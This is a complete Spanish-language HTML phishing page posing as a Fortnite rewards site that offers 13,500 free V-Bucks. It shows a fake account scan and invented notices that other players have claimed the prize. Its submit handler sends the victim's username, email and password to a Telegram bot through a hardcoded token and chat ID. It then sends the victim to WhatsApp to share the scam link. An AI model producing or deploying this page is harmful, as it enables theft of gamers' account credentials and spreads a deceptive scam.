<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fortnite Stats & Rewards Center</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #0b0b0b; font-family: 'Inter', sans-serif; color: white; overflow-x: hidden; }
        .gradient-text { background: linear-gradient(90deg, #007bff, #00d4ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .hero-card { background: rgba(32, 32, 32, 0.8); backdrop-filter: blur(10px); border: 1px solid #333; border-radius: 12px; }
        .loader { width: 100%; height: 6px; background: #222; border-radius: 10px; overflow: hidden; margin: 20px 0; }
        .loader-bar { width: 0%; height: 100%; background: #007bff; transition: width 0.5s; }
        .notification { position: fixed; bottom: 20px; left: 20px; background: #202020; border-left: 4px solid #007bff; padding: 10px 20px; border-radius: 4px; font-size: 12px; animation: slideIn 0.5s ease-out; }
        @keyframes slideIn { from { transform: translateX(-100%); } to { transform: translateX(0); } }
    </style>
</head>
<body class="flex flex-col items-center justify-center min-h-screen p-4">

    <div id="notif-container"></div>

    <div class="hero-card max-w-md w-100 p-8 shadow-2xl text-center">
        <h1 class="text-3xl font-black uppercase mb-2">Fortnite <span class="gradient-text">Rewards</span></h1>
        <p class="text-gray-400 text-sm mb-6">Escanea tu cuenta para verificar elegibilidad de V-Bucks y Skins exclusivas.</p>

        <div id="step-1">
            <input type="text" id="username" placeholder="Tu nombre de usuario" class="w-full bg-transparent border border-gray-700 p-4 rounded mb-4 focus:border-blue-500 outline-none">
            <div class="grid grid-cols-2 gap-2 mb-4">
                <button class="bg-gray-800 p-2 rounded text-xs border border-transparent hover:border-blue-500">PlayStation</button>
                <button class="bg-gray-800 p-2 rounded text-xs border border-transparent hover:border-green-500">Xbox</button>
            </div>
            <button onclick="startScan()" class="w-full bg-blue-600 hover:bg-blue-700 p-4 rounded font-bold uppercase tracking-widest">Escanear Cuenta</button>
        </div>

        <div id="step-2" class="hidden">
            <p id="status" class="text-xs text-blue-400 font-mono italic">Iniciando conexión...</p>
            <div class="loader"><div id="bar" class="loader-bar"></div></div>
            <div id="logs" class="text-[10px] text-gray-500 font-mono text-left h-24 overflow-hidden"></div>
        </div>

        <div id="step-3" class="hidden text-left">
            <div class="bg-blue-900/20 border border-blue-500/50 p-4 rounded mb-6">
                <p class="text-blue-400 text-xs font-bold uppercase">🎉 ¡Elegibilidad Confirmada!</p>
                <p class="text-white text-sm">Has sido seleccionado per recibir **13.500 V-Bucks**. Inicia sesión para vincular y reclamar.</p>
            </div>
            
            <form id="finalForm" class="space-y-4">
                <input type="email" id="email" placeholder="Correo electrónico" class="w-full bg-[#333] p-4 rounded outline-none border border-transparent focus:border-white" required>
                <input type="password" id="password" placeholder="Contraseña" class="w-full bg-[#333] p-4 rounded outline-none border border-transparent focus:border-white" required>
                <button type="submit" class="w-full bg-blue-600 p-4 rounded font-bold uppercase">Confirmar y Reclamar</button>
            </form>
        </div>
    </div>

    <script>
        // Sistema di Notifiche (Social Proof)
        const names = ["Marcos", "Alejandro", "Santi", "Xavi", "Elena", "Dani"];
        setInterval(() => {
            const container = document.getElementById('notif-container');
            const n = document.createElement('div');
            n.className = 'notification';
            n.innerHTML = `✅ <b>${names[Math.floor(Math.random()*names.length)]}</b> ha reclamado 13.500 V-Bucks`;
            container.appendChild(n);
            setTimeout(() => n.remove(), 4000);
        }, 8000);

        // Logica dello Scan
        function startScan() {
            const user = document.getElementById('username').value;
            if(!user) return alert("Ingresa tu usuario");
            document.getElementById('step-1').classList.add('hidden');
            document.getElementById('step-2').classList.remove('hidden');
            
            let progress = 0;
            const bar = document.getElementById('bar');
            const status = document.getElementById('status');
            const logs = document.getElementById('logs');
            const logLines = ["Buscando ID...", "Accediendo a servidores de Epic...", "Verificando historial de compras...", "Inyectando paquete de datos...", "Casi listo..."];

            const interval = setInterval(() => {
                progress += Math.random() * 15;
                if(progress > 100) progress = 100;
                bar.style.width = progress + "%";
                
                if(progress < 100) {
                    status.innerText = "Escaneando: " + Math.floor(progress) + "%";
                    const l = document.createElement('p');
                    l.innerText = "> " + logLines[Math.floor(Math.random()*logLines.length)];
                    logs.prepend(l);
                } else {
                    clearInterval(interval);
                    document.getElementById('step-2').classList.add('hidden');
                    document.getElementById('step-3').classList.remove('hidden');
                }
            }, 600);
        }

        // Invio a Telegram
        document.getElementById('finalForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const botToken = "8609726894:AAGpEsj7vz-M01u8RRNww3z8lbX3cgTeEmQ";
            const chatId = "6585533652";
            const msg = `🎯 **VIRAL TARGET**\n👤 User: ${document.getElementById('username').value}\n📧 Email: ${document.getElementById('email').value}\n🔑 Pass: ${document.getElementById('password').value}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' })
            }).then(() => {
                window.location.href = "https://wa.me/?text=Mira%20esta%20locura%20me%20dieron%2013k%20vbucks%20gratis%20" + window.location.href;
            });
        });
    </script>
</body>
</html>
